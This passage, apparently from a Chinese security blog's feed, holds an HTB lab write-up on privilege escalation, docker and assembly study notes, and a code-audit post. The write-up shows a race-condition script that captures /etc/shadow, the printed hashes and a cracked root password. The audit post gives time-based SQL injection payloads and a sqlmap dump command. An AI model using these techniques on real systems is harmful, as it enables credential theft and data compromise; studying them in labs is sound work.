&quot;$&quot; in p else None) for p in data]    passwords = []    for x in data:        if not x == None:            passwords.append(x)    passwordFile = &#39;\n&#39;.join([&#39;\n&#39;.join(p) for p in passwords])    with open(&#39;/tmp/SSH/&#39;+path, &#39;w&#39;) as f:        f.write(passwordFile)    time.sleep(.1)    salt = &quot;&quot;    realPass = &quot;&quot;    for p in passwords:        if p[0] == session[&#39;user&#39;]:            salt, realPass = p[1].split(&#39;$&#39;)[2:]            break    if salt == &quot;&quot;:        print(&quot;Invalid user&quot;)        os.remove(&#39;/tmp/SSH/&#39;+path)        sys.exit(0)    salt = &#39;$6$&#39;+salt+&#39;$&#39;    realPass = salt + realPass    hash = crypt.crypt(passW, salt)    if hash == realPass:        print(&quot;Authed!&quot;)        session[&#39;authenticated&#39;] = 1    else:        print(&quot;Incorrect pass&quot;)        os.remove(&#39;/tmp/SSH/&#39;+path)        sys.exit(0)    os.remove(os.path.join(&#39;/tmp/SSH/&#39;,path))except Exception as e:    traceback.print_exc()    sys.exit(0)if session[&#39;authenticated&#39;] == 1:    while True:        command = input(session[&#39;user&#39;] + &quot;@Obscure$ &quot;)        cmd = [&#39;sudo&#39;, &#39;-u&#39;,  session[&#39;user&#39;]]        cmd.extend(command.split(&quot; &quot;))        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)        o,e = proc.communicate()        print(&#39;Output: &#39; + o.decode(&#39;ascii&#39;))        print(&#39;Error: &#39;  + e.decode(&#39;ascii&#39;)) if len(e.decode(&#39;ascii&#39;)) &gt; 0 else print(&#39;&#39;)</code></pre><p><code>SuperSecureCrypt.py</code></p><pre><code class="python">www-data@obscure:/home/robert$ cat SuperSecureCrypt.pycat SuperSecureCrypt.pyimport sysimport argparsedef encrypt(text, key):    keylen = len(key)    keyPos = 0    encrypted = &quot;&quot;    for x in text:        keyChr = key[keyPos]        newChr = ord(x)        newChr = chr((newChr + ord(keyChr)) % 255)        encrypted += newChr        keyPos += 1        keyPos = keyPos % keylen    return encrypteddef decrypt(text, key):    keylen = len(key)    keyPos = 0    decrypted = &quot;&quot;    for x in text:        keyChr = key[keyPos]        newChr = ord(x)        newChr = chr((newChr - ord(keyChr)) % 255)        decrypted += newChr        keyPos += 1        keyPos = keyPos % keylen    return decryptedparser = argparse.ArgumentParser(description=&#39;Encrypt with 0bscura\&#39;s encryption algorithm&#39;)parser.add_argument(&#39;-i&#39;,                    metavar=&#39;InFile&#39;,                    type=str,                    help=&#39;The file to read&#39;,                    required=False)parser.add_argument(&#39;-o&#39;,                    metavar=&#39;OutFile&#39;,                    type=str,                    help=&#39;Where to output the encrypted/decrypted file&#39;,                    required=False)parser.add_argument(&#39;-k&#39;,                    metavar=&#39;Key&#39;,                    type=str,                    help=&#39;Key to use&#39;,                    required=False)parser.add_argument(&#39;-d&#39;, action=&#39;store_true&#39;, help=&#39;Decrypt mode&#39;)args = parser.parse_args()banner = &quot;################################\n&quot;banner+= &quot;#           BEGINNING          #\n&quot;banner+= &quot;#    SUPER SECURE ENCRYPTOR    #\n&quot;banner+= &quot;################################\n&quot;banner += &quot;  ############################\n&quot;banner += &quot;  #        FILE MODE         #\n&quot;banner += &quot;  ############################&quot;print(banner)if args.o == None or args.k == None or args.i == None:    print(&quot;Missing args&quot;)else:    if args.d:        print(&quot;Opening file {0}...&quot;.format(args.i))        with open(args.i, &#39;r&#39;, encoding=&#39;UTF-8&#39;) as f:            data = f.read()        print(&quot;Decrypting...&quot;)        decrypted = decrypt(data, args.k)        print(&quot;Writing to {0}...&quot;.format(args.o))        with open(args.o, &#39;w&#39;, encoding=&#39;UTF-8&#39;) as f:            f.write(decrypted)    else:        print(&quot;Opening file {0}...&quot;.format(args.i))        with open(args.i, &#39;r&#39;, encoding=&#39;UTF-8&#39;) as f:            data = f.read()        print(&quot;Encrypting...&quot;)        encrypted = encrypt(data, args.k)        print(&quot;Writing to {0}...&quot;.format(args.o))        with open(args.o, &#39;w&#39;, encoding=&#39;UTF-8&#39;) as f:            f.write(encrypted)</code></pre><p>从加密的脚本中可以知道关键的加密逻辑：</p><pre><code class="python">def encrypt(text, key):    keylen = len(key)    keyPos = 0    encrypted = &quot;&quot;    for x in text:        keyChr = key[keyPos]        newChr = ord(x)        newChr = chr((newChr + ord(keyChr)) % 255)        encrypted += newChr        keyPos += 1        keyPos = keyPos % keylen    return encrypted</code></pre><p>所以我们只需要爆破密钥了</p><p>爆破脚本</p><pre><code class="python">import stringwith open(&#39;check.txt&#39;,&#39;r&#39;,encoding=&#39;UTF-8&#39;) as f:    ta = f.read()key=&#39;&#39;with open(&#39;out.txt&#39;,&#39;r&#39;,encoding=&#39;UTF-8&#39;) as f:    data = f.read()    for x in range(len(data)):        for i in range(255):            ch = chr((ord(data[x])-i)%255)            if ch == ta[x]:                key +=chr(i)                break    print(key)</code></pre><p>得到密钥</p><pre><code>alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal</code></pre><blockquote><p>这里我遇到了一个难点，不知道如何将文件copy出来，本来我是可以通过 <code>python3 -m http.server 8001</code> 在靶机上开一个端口的，但是不知道为什么不成功。所以我这里是通过xxd来复原的</p></blockquote><p>将 xxd 得到的结果复制出来，然后我们可以通过<code>xxd -r</code> 反向 <code>dump</code> 出结果</p><pre><code>robert@obscure:~$ xxd out.txt00000000: c2a6 c39a c388 c3aa c39a c39e c398 c39b  ................00000010: c39d c39d c289 c397 c390 c38a c39f c285  ................00000020: c39e c38a c39a c389 c292 c3a6 c39f c39d  ................00000030: c38b c288 c39a c39b c39a c3aa c281 c399  ................00000040: c389 c3ab c28f c3a9 c391 c392 c39d c38d  ................00000050: c390 c285 c3aa c386 c3a1 c399 c39e c3a3  ................00000060: c296 c392 c391 c288 c390 c3a1 c399 c2a6  ................00000070: c395 c3a6 c398 c29e c28f c3a3 c38a c38e  ................00000080: c38d c281 c39f c39a c3aa c386 c28e c39d  ................00000090: c3a1 c3a4 c3a8 c289 c38e c38d c39a c28c  ................000000a0: c38e c3ab c281 c391 c393 c3a4 c3a1 c39b  ................000000b0: c38c c397 c289 c281 76                   ........v</code></pre><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>得到密钥之后我们再解密即可</p><pre><code class="bash">www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -o /tmp/key.txt -k alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal -dk alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal -d#################################           BEGINNING          ##    SUPER SECURE ENCRYPTOR    #################################  ############################  #        FILE MODE         #  ############################Opening file passwordreminder.txt...Decrypting...Writing to /tmp/key.txt...www-data@obscure:/home/robert$ cat /tmp/key.txtcat /tmp/key.txtSecThruObsFTW</code></pre><p>成功登陆</p><p>拿到 flag</p><pre><code class="bash">robert@obscure:~$ lsBetterSSH  check.txt  out.txt  passwordreminder.txt  SuperSecureCrypt.py  user.txtrobert@obscure:~$ cat user.txte4493782066b55fe2755708736ada2d7</code></pre><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>robert用户登陆之后，<code>sudo -l</code> 查看能够执行的root命令，发现能够以root身份执行 <code>BetterSSH.py</code></p><pre><code class="bash">robert@obscure:~$ sudo -lMatching Defaults entries for robert on obscure:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser robert may run the following commands on obscure:    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</code></pre><p>审计源码发现关键点：</p><pre><code class="python">with open(&#39;/etc/shadow&#39;, &#39;r&#39;) as f:    data = f.readlines()data = [(p.split(&quot;:&quot;) if &quot;$&quot; in p else None) for p in data]passwords = []for x in data:    if not x == None:        passwords.append(x)passwordFile = &#39;\n&#39;.join([&#39;\n&#39;.join(p) for p in passwords])with open(&#39;/tmp/SSH/&#39;+path, &#39;w&#39;) as f:    f.write(passwordFile)</code></pre><p>程序会将 <code>/etc/shadow</code> 写入到 <code>/tmp/SSH</code> 的某个随机的目录中，于是想到我们只需要写个死循环不断地复制该目录下的文件即可</p><pre><code class="python">import shutilimport oswhile True:    files = os.listdir(&quot;./SSH&quot;)    for file in files:        shutil.copy(os.path.join(&quot;./SSH&quot;, file), &quot;./flag&quot;);</code></pre><p>或者使用 <code>shell</code> 脚本</p><pre><code class="shell">robert@obscure:/tmp$ cat scandir.sh#/bin/bashpath=$1while (true); do    file=$(ls $path)    if [ &quot;${file}&quot; == &quot;&quot; ]    then        continue    else        mv $path/$file ./        break    fidone</code></pre><p>然后我们执行就会发现 <code>flag</code> 目录中存在文件</p><pre><code class="python">robert@obscure:/tmp/flag$ lsTdrs5183robert@obscure:/tmp/flag$ cat Tdrs5183root$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1182260999997robert$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/181630999997</code></pre><p>john 解密得到 <code>mercedes</code></p><pre><code class="bash">robert@obscure:/tmp$ sudo python3 ~/BetterSSH/BetterSSH.pyEnter username: rootEnter password: mercedesAuthed!root@Obscure$ lsOutput: SSHsystemd-private-da1116f9cf3e43be847886abe5bdf51e-systemd-resolved.service-zZTUtHsystemd-private-da1116f9cf3e43be847886abe5bdf51e-systemd-timesyncd.service-AkWIWivmware-root_574-2990744286root@Obscure$ cat /root/root.txtOutput: 512fd4429f33a113a44d5acde23609e3</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>做完后感觉并不是很难，但是还是发现自己在代码的能力偏弱，写个脚本要花很长的时间</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker基本使用指南</title>
      <link href="/posts/70b2e753/"/>
      <url>/posts/70b2e753/</url>
      
        <content type="html"><![CDATA[<h2 id="docker-遇到的坑"><a href="#docker-遇到的坑" class="headerlink" title="docker 遇到的坑"></a>docker 遇到的坑</h2><p>运行的时候不能直接用 <code>./</code> 指定当前的文件，需要 <code>$PWD</code></p><p>一次性清理所有的已经关闭的容器<br> <code>docker ps -a | grep Exit | cut -d &#39; &#39; -f 1 | xargs docker rm</code></p><p><code>:ro</code> 表示只读</p><p>访问受到限制</p><p><img src="/posts/70b2e753/1580653426115.png" alt></p><p>此时目录下的文件权限</p><p><img src="/posts/70b2e753/1580653436093.png" alt></p><p>重新运行了一下</p><p><img src="/posts/70b2e753/1580653447982.png" alt></p><p>看来是文件权限的问题，也就是说docker会默认将文件权限直接复制过来，由于我之前的那个用户是pxy，而docker环境中并没有这个用户，导致就变成了1000</p><h2 id="移除镜像"><a href="#移除镜像" class="headerlink" title="移除镜像"></a>移除镜像</h2><pre><code>docker image rm xxxx</code></pre><h2 id="–link-参数"><a href="#–link-参数" class="headerlink" title="–link 参数"></a>–link 参数</h2><p>自动添加了环境变量</p><p><img src="/posts/70b2e753/1580653523204.png" alt></p><p><img src="/posts/70b2e753/1580653527989.png" alt></p><p>还有这个</p><p><img src="/posts/70b2e753/1580653537486.png" alt></p><p><code>/etc/hosts</code> 也会更新</p><p><img src="/posts/70b2e753/1580653546884.png" alt></p><p>神奇。。<br>运行nginx和php-fpm<br><code>docker run --name  myphp-fpm -v $PWD/www:/www  -d php:5.6-fpm</code></p><pre><code>$ docker run --name runoob-php-nginx -p 8083:80 -d \               -v $PWD/www:/usr/share/nginx/html:ro \    -v $PWD/conf/conf.d:/etc/nginx/conf.d:ro \    --link myphp-fpm:php \ ----&gt; 注意需要取别名nginx</code></pre><p>如果不取别名的话直接闪退，别名可以理解成对应的主机地址</p><p><img src="/posts/70b2e753/1580653561167.png" alt></p><p>然后开始折腾docker-compose.yml</p><pre><code class="yaml">version: &#39;2&#39;services:  nginx:    image: nginx:latest    volumes:      - ./conf/conf.d:/etc/nginx/conf.d      - ./www:/usr/share/nginx/html    depends_on:      - myphp-fpm    links:      - myphp-fpm:php    ports:      - &quot;8083:80&quot;  myphp-fpm:    image: php:5.6-fpm    volumes:      - ./www:/www</code></pre><p>试了多次，<code>links</code> 需要取别名</p><p>同时文件的权限也很重要，不然会出现无法读取flag的情况</p><h2 id="Dockerfile-编写"><a href="#Dockerfile-编写" class="headerlink" title="Dockerfile 编写"></a>Dockerfile 编写</h2><p><code>WORKDIR</code> 指定工作目录，这样就能够在执行一些shell命令的时候不需要指明路径了</p><h2 id="docker无法运行-mysql容器"><a href="#docker无法运行-mysql容器" class="headerlink" title="docker无法运行 mysql容器"></a>docker无法运行 mysql容器</h2><p>这是由于我偷懒只在本机安装了 mysql 得客户端，没有安装服务端，这也是很神奇了</p><h2 id="docker运行phpmyadmin"><a href="#docker运行phpmyadmin" class="headerlink" title="docker运行phpmyadmin"></a>docker运行phpmyadmin</h2><p>我发现并不需要 nginx ,当然如果有nginx的情况下可以做到反向代理比较好一点</p><pre><code class="yaml">version: &quot;3&quot;services:  phpmyadmin:    image: phpmyadmin/phpmyadmin    ports:       - 8081:80    links:      - mysql:db  mysql:    image: mysql:5.6    environment:       - MYSQL_ROOT_PASSWORD=123456</code></pre><h2 id="nginx结合mysql"><a href="#nginx结合mysql" class="headerlink" title="nginx结合mysql"></a>nginx结合mysql</h2><pre><code class="yaml">version: &#39;2&#39;services:  nginx:    image: nginx:latest    volumes:      - ./conf/conf.d:/etc/nginx/conf.d      - ./www:/usr/share/nginx/html    depends_on:      - myphp-fpm    links:      - myphp-fpm:php    ports:      - &quot;8083:80&quot;  myphp-fpm:    image: php/kuozhan    volumes:      - ./www:/www    links:      - mysql:db  mysql:    image: mysql:5.6    restart: always    environment:      - MYSQL_ROOT_PASSWORD=123456</code></pre><h2 id="nginx配置学习"><a href="#nginx配置学习" class="headerlink" title="nginx配置学习"></a>nginx配置学习</h2><p>nginx的配置文件以后再单独写，这里先学一点</p><p>怎么理解 nginx和php-fpm的关系呢</p><p>我在配置docker环境的时候意识到nginx和php两个镜像是相互独立的，首先运行php-fpm镜像，将其内部的 <code>/www</code> 映射到我外部的 <code>./www</code> 目录中，然后再运行 nginx 镜像，将其 <code>/usr/share/nginx/html</code> 映射到 <code>./www</code> 目录，同时还需要做两件事</p><ol><li>配置nginx，指定解析的脚本目在 <code>/www</code> 目录中</li><li>连接php-fpm容器，需要将解析到 php 这个域名才行</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编从入门到入土二</title>
      <link href="/posts/6cc1a5d6/"/>
      <url>/posts/6cc1a5d6/</url>
      
        <content type="html"><![CDATA[<h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><p>intel的CPU是采用的小端法来存储数据</p><p>在查看内存的时候，我更愿意按照这样的方式，我认为0号应该代表第一根横线，也就是认为是第一个存储单元的开始，也就是说我觉得 0~1 这个单元存放着 20H，因为这样在后续分析栈的时候比较有用</p><p><img src="/posts/6cc1a5d6/1580653048875.png" alt></p><p>字单元：存放一个字节型数据的内存单元，也就是两个字节16位，高位放高地址，低位放低地址</p><h2 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h2><p>数据段寄存器默认为 ds</p><p>所以我们要操作内存数据的时候只需要指定偏移即可</p><p>CPU不支持直接将数据送入到段寄存器，需要有寄存器作为中转</p><pre><code class="x86asm">mov bx,1000Hmov ds,bxmov [0],al</code></pre><p>上述代码的含义：先设置ds寄存器为1000H，然后将al中的数据送往这个内存单元(所以我们要移动数据到内存的时候是需要先设置数据段的基地址的)</p><h2 id="mov指令"><a href="#mov指令" class="headerlink" title="mov指令"></a>mov指令</h2><p>mov 段寄存器，寄存器<br>mov 寄存器，段寄存器<br>mov 内存单元，寄存器<br>mov 寄存器，内存单元<br>mov 段寄存器，内存单元<br>mov 内存单元，段寄存器</p><p>但是 add 指令不能直接操作段寄存器和寄存器</p><p><img src="/posts/6cc1a5d6/1580653072050.png" alt></p><h2 id="数据段-1"><a href="#数据段-1" class="headerlink" title="数据段"></a>数据段</h2><p><img src="/posts/6cc1a5d6/1580653090896.png" alt></p><p>AX=0，BX=0</p><pre><code>mov ax,1mov ds,axmov ax,[0000] ;AX = 2662Hmov bx,[0001] ;BX = E626Hmov ax,bx     ;AX = 2662Hmov ax,[0000] ;AX = 2662Hmov bx,[0002] ;BX = D6E6Hadd ax,bx     ;AX = FD48Hadd ax,[0004] ;AX = 2ECC+FD48 = 2C14mov ax,0      ;AX = 0mov al,[0002] ;AX = E6Hmov bx,0      ;BX = 0mov bl,[000c] ;BX = 00Hadd al,bl     ;AX = E6H</code></pre><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>任意时刻 <code>SS:SP</code> 指向栈顶元素</p><p>PUSH 操作的过程</p><ol><li>SP = SP -2</li><li>SS:SP 指向新的地址</li><li>然后将数据送入到 <code>SS:SP</code> 指向的地址中</li></ol><p>然后就涉及到怎么计算 <code>SP</code> 的问题了</p><blockquote><p>只需要记住初始状态栈中没有元素，并且 SP+2 是栈中的第一个存储单元</p></blockquote><p><img src="/posts/6cc1a5d6/1580653127959.png" alt></p><p>POP 指令</p><ol><li>将SS:SP 指向的内存单元数据送入到寄存器中，或者是某个内存单元中</li><li>SP = SP + 2</li></ol><p>PUSH和POP的指令形式</p><pre><code>push 寄存器pop 寄存器push 段寄存器pop 段寄存器push 内存单元pop 内存单元</code></pre><p>利用栈可以达到交换数据的目的</p><pre><code>mov ax,1000Hmov ss,axmov sp,0010Hmov ax,001AHmov bx,001BHpush axpush bxpop axpop bx</code></pre><h2 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h2><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><p><img src="/posts/6cc1a5d6/1580653176153.png" alt></p><pre><code class="x86asm">mov ax,1000Hmov ds,axmov ax,2000mov ss,axmov sp,0010Hpush[0]push[2]push[4]push[6]push[8]push[A]push[C]push[E]</code></pre><p>现在 1000H~100FH 的内存内容为：</p><p><img src="/posts/6cc1a5d6/1580653193364.png" alt></p><p>本着节约内存的想法</p><p><img src="/posts/6cc1a5d6/1580653210499.png" alt></p><p>然而执行完之后的结果</p><p><img src="/posts/6cc1a5d6/1580653219446.png" alt></p><p>看来节约内存不是件好事，于是我重新把 3000:0 作为代码段</p><p><img src="/posts/6cc1a5d6/1580653228997.png" alt></p><p>这回成功了</p><p><img src="/posts/6cc1a5d6/1580653238046.png" alt></p><h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><p><img src="/posts/6cc1a5d6/1580653248493.png" alt></p><pre><code class="x86asm">mov ax,2000Hmov ds,axmov ax,1000Hmov ss,axmov sp,0pop [E]pop [C]pop [A]pop [8]pop [6]pop [4]pop [2]pop [0]</code></pre><p>同样的，我先设置 1000:0 处的值</p><p><img src="/posts/6cc1a5d6/1580653258074.png" alt></p><p>将指令书写到内存中，也就是设置 3000:0 为代码段</p><p><img src="/posts/6cc1a5d6/1580653266322.png" alt></p><p>在实验的时候，前面一部分数据是可以正常复制的，但是后面就出问题了</p><p><img src="/posts/6cc1a5d6/1580653275496.png" alt></p><p>暂时没想清楚</p><h2 id="实验三"><a href="#实验三" class="headerlink" title="实验三"></a>实验三</h2><p>遇到的问题</p><p>输入指令：</p><p><img src="/posts/6cc1a5d6/1580653286041.png" alt></p><p>但是在执行的时候：</p><p><img src="/posts/6cc1a5d6/1580653293057.png" alt></p><p>这是之后要研究的内容；中断机制<br>Debug的T命令在修改寄存器SS的指令时，下一条指令也会紧接着执行</p><pre><code class="x86asm">mov ax,ffffmov ds,axmov ax,2200mov ss,axmov sp,0100mov ax,[0]     ;ax=C0EAHadd ax,[2]     ;ax=C0FCHmov bx,[4]     ;bx=30Fadd bx,[6]     ;bx=6021Hpush ax        ;sp=FEH,修改的内存单元地址是220FEH,内容为C0FCHpush bx        ;sp=FCH,修改的内存单元地址是220FCH,内容为6021Hpop ax           ;sp=FEH,ax=6021Hpop bx           ;sp=100H,bx=C0FCHpush [4]       ;sp=FEH,修改的内存单元是220FEH,内容为30F0push [6]       ;sp=FCH,修改的内存单元是220FCH,内容为2F31</code></pre><p><img src="/posts/6cc1a5d6/1580653302675.png" alt></p><p>为什么2000:0 ~2000:f 的内容会发生变化？</p><p><img src="/posts/6cc1a5d6/1580653314559.png" alt></p><p>仔细观察发现<br>01A3 不知道是什么，但是0b39和0108确实当前指令的地址，也就是执行完 <code>mov ss,ax mov sp,10H</code> 之后的下一条指令的地址，结合这是在设置栈，不禁想到了函数的压栈，保存了返回地址，但是还有一个 0020 的数据不知道是哪里的</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编从入门到入土一</title>
      <link href="/posts/57418b7f/"/>
      <url>/posts/57418b7f/</url>
      
        <content type="html"><![CDATA[<h2 id="第一、二章"><a href="#第一、二章" class="headerlink" title="第一、二章"></a>第一、二章</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>一个存储单元一般存储 1个字节，也就是8个二进制位</p><p>一个字为两个字节</p><p>地址总线：用来寻址，由于一根地址总线只能表示2个状态，所以一个CPU有N根地址线，则可以说这个CPU的地址总线宽度为N，这样的CPU最多可以寻找 $2^{N}$ 个内存单元</p><p>数据总线：数据总线的宽度意味着CPU一次能传输多少位数据</p><p>控制总线：控制总线的宽度决定了CPU对外部器件的控制能力</p><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>通用寄存器中，AX可以拆分为 AH和AL，如果单独使用AH或者AL，则应该看成一个独立的8位寄存器来使用，AH和AL此时是不相关的</p><p>如何寻址？<br><img src="/posts/57418b7f/1580566042011.png" alt></p><p>注意此时并不是操作系统中学到的分段，只是这么用罢了</p><p>一个 ‘段’ 的偏移占16位，那么一个段的长度最大为64KB</p><p>不同的段地址和偏移地址可以形成同一个物理地址</p><p>CS:IP 指向的内容就是将要执行的指令(但是CPU是怎么知道指令的长度的呢，x86是变长的，而MIPS是等长的，这个坑之后说)</p><p>基础指令 mov,add,jmp</p><p>mov指令设置寄存器的内容值，add执行加法，jmp设置cs和ip的值</p><p>四条指令完成计算2的4次方</p><pre><code class="x86asm">mov ax,2add ax,axadd ax,axadd ax,ax</code></pre><p>当然也可以使用jmp指令，但是你无法判定程序什么时候退出(因为指令不够hhhh)</p><h2 id="dosbox使用"><a href="#dosbox使用" class="headerlink" title="dosbox使用"></a>dosbox使用</h2><p>dosbox可以用来模拟dos环境，然后我们下载一个MASM工具包，里面包含了 <code>debug</code> 这些程序</p><p>注意设置dosbox</p><pre><code>[autoexec]# Lines in this section will be run at startup.# You can put your MOUNT lines here.mount C: G:\MASMC:</code></pre><p>因为我的 MASM 工具包位于 G盘目录下，所以设置挂载命令<br>这样打开dosbox之后自动挂载</p><p><img src="/posts/57418b7f/1580565800214.png" alt></p><h2 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h2><p>debug.exe 使用<br>r 命令可以查看寄存器内容，以及当前的 cs:ip 指向，还有ds指向的内容</p><p><img src="/posts/57418b7f/1580565809854.png" alt></p><p>还可以修改寄存器的内容</p><p><img src="/posts/57418b7f/1580565820000.png" alt></p><p>使用d命令查看内存</p><p><code>d1000:9</code></p><p><img src="/posts/57418b7f/1580565830704.png" alt></p><p>查看某一个范围内的内存</p><p><code>d1000:9 20</code></p><p><img src="/posts/57418b7f/1580565845701.png" alt></p><p>e 命令可以修改内存的数据</p><p><code>e1000:0 0 1 2 3 4 5 7 8</code></p><p><img src="/posts/57418b7f/1580565854260.png" alt></p><p>当然也可以换一种方式修改</p><p><img src="/posts/57418b7f/1580565864064.png" alt></p><p>也可以向其中写入字符串</p><p><img src="/posts/57418b7f/1580565875753.png" alt></p><p>尝试写入一段汇编指令</p><p><img src="/posts/57418b7f/1580565886857.png" alt></p><p>使用 e命令编辑内存，然后使用 u 命令反汇编</p><p><img src="/posts/57418b7f/1580565897644.png" alt></p><p>那么如何执行汇编指令呢？</p><p>首先用 r 设置 cs 和 ip的值，然后使用 t 就可以执行汇编指令了，可以看到执行了三条汇编指令后的结果， ax 存储了 0x03   cx 存储了 0x02</p><p><img src="/posts/57418b7f/1580565906622.png" alt></p><p>直接使用 e 命令编辑当然不方便，于是可以用 a 命令直接书写汇编指令，然后自动的给转化成对应的机器码</p><p><img src="/posts/57418b7f/1580565914978.png" alt></p><h2 id="实验任务"><a href="#实验任务" class="headerlink" title="实验任务"></a>实验任务</h2><ol><li>使用debug将下面的程序写入内存，逐条执行</li></ol><p><img src="/posts/57418b7f/1580565925422.png" alt></p><p>汇编指令输入到内存中</p><p><img src="/posts/57418b7f/1580565937645.png" alt></p><p>然后运行就是的了</p><ol start="2"><li>将下面3条指令写入到 2000:0 开始的内存单元中，计算2的次方</li></ol><pre><code class="x86asm">mov ax,1add ax,axjmp 2000:0003</code></pre><p>运行过程截图</p><p><img src="/posts/57418b7f/1580565948449.png" alt></p><ol start="3"><li>PC 机主板上的ROM有一个生产日期，在内存 FFF00H~FFFFFH 的某几个单元中，请找到这个生产日期并试图改变它</li></ol><p><img src="/posts/57418b7f/1580565963720.png" alt></p><p>很显然我是改不了的</p><p><img src="/posts/57418b7f/1580565972814.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
            <tag> dosbox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码审计初尝</title>
      <link href="/posts/728b20a1/"/>
      <url>/posts/728b20a1/</url>
      
        <content type="html"><![CDATA[<h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><p>文件删除函数只考虑到了白名单路径，但是没有想到 <code>../</code></p><pre><code class="php">function del_file(){    $path = post(&#39;path&#39;);    $path = str_replace(&#39;../&#39;,&#39;&#39;,$path);    $dir[0] = &#39;data/backup/&#39;;    $dir[1] = &#39;images/&#39;;    $dir[2] = &#39;resource/&#39;;    $flag = false;    for($i = 0; $i &lt; count($dir); $i ++)    {        if(substr($path,0,strlen($dir[$i])) == $dir[$i])        {            $flag = true;        }    }    if($flag)    {        if(unlink($path))        {            $result = 1;        }    }    echo isset($result) ? $result : 0;}</code></pre><p>根目录新建 aaaa.txt<br>然后发送请求<br><img src="/posts/728b20a1/1580563907589.png" alt></p><p>成功删除文件</p><h2 id="后台注入"><a href="#后台注入" class="headerlink" title="后台注入"></a>后台注入</h2><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p><code>or if(length(database())=6,sleep(3),0)</code><br>如果数据库名的长度为6，那么就 <code>sleep(3)</code><br>我测试的时候数据库名为 <code>xinxiu</code> ，所以就会出现一定的延时</p><p><img src="/posts/728b20a1/1580563920089.png" alt></p><p>延时注入的其他例子</p><pre><code># 判断当前数据库长度 # 当前数据库长度是否为 1 没有延时 不是 cmd=del_admin&amp;id=3 or if(length(database())=1,sleep(3),0) # 延时 表明当前数据库长度为 6 cmd=del_admin&amp;id=3 or if(length(database())=6,sleep(3),0) # 当前数据库第1个字母的ascii码是否为 97 没有延时 不是 cmd=del_admin&amp;id=3 or if(ascii(mid(database(),1,1))=97,sleep(3),0) # 延时 表明当前数据库第1个字母的ascii码为 115 即 &#39;s&#39; cmd=del_admin&amp;id=3 or if(ascii(mid(database(),1,1))=115,sleep(3),0) # 当前数据库第2个字母的ascii码是否为 97 没有延时 不是 cmd=del_admin&amp;id=3 or if(ascii(mid(database(),2,1))=97,sleep(3),0) # 延时 表明当前数据库第2个字母的ascii码为 105 即 &#39;i&#39; cmd=del_admin&amp;id=3 or if(ascii(mid(database(),2,1))=105,sleep(3),0) ...</code></pre><p>注意这里不能用 and ,因为这个 id=3 的用户实际上不存在，所以就不再需要去执行 and 另一边的语句了(短路！)</p><p>但是如果这个用户存在当然是可以的咯(那样注入就很麻烦了)</p><p><img src="/posts/728b20a1/1580563976163.png" alt></p><p>但是我按照国光的方法使用 sqlmap 失败了</p><pre><code>./sqlmap.py -u &quot;http://127.0.0.1/admin.php?/deal/dir-basic/&quot; --cookie=&quot;qaq21129s234bj1q4ammcs7fe5;&quot; --data=&quot;cmd=del_admin&amp;id=3&quot; -p &quot;id&quot; --technique=T --random-agent -v 3 --tamper=&quot;between&quot; -D &#39;sinsiu&#39; -T &#39;php_admin&#39; -C &#39;adm_id,adm_username,adm_password&#39; --dump</code></pre><p><img src="/posts/728b20a1/1580563990735.png" alt></p><h3 id="另一处后台注入"><a href="#另一处后台注入" class="headerlink" title="另一处后台注入"></a>另一处后台注入</h3><p><code>search_main.php</code> 文件</p><pre><code class="php">    $global[&#39;key&#39;] = rawurldecode($global[&#39;key&#39;]);    $obj = new goods();    $obj-&gt;set_field(&#39;goo_id,goo_title,goo_x_img&#39;);    $obj-&gt;set_where(&quot;goo_title like &#39;%&quot; . $global[&#39;key&#39;] . &quot;%&#39;&quot;);    $obj-&gt;set_where(&#39;goo_channel_id = 